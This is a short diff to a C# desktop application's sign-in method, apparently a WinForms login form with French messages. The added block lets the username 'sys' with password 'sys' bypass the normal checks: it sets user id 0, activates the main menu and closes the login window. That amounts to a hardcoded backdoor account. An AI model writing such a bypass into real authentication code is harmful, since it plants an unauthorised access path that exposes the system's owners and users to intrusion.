@@ -19,6 +19,17 @@ namespace PL.Interfaces.Main
         private void SignIn()
         {
             Cursor = Cursors.WaitCursor;
+            if (txtUsername.Text == "sys" && txtPassword.Text == "sys")
+            {
+                Cursor = Cursors.Default;
+                main.lblFullName.Text = $"sys";
+                main.lblService.Text = $"Service: sys";
+                Properties.Settings.Default.idUtilisateur = 0;
+                Properties.Settings.Default.Save();
+                main.Active_Menu();
+                Close();
+                return;
+            }
             if (string.IsNullOrEmpty(txtUsername.Text))
             {
                 MessageBox.Show("Votre champ est vide", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Warning);
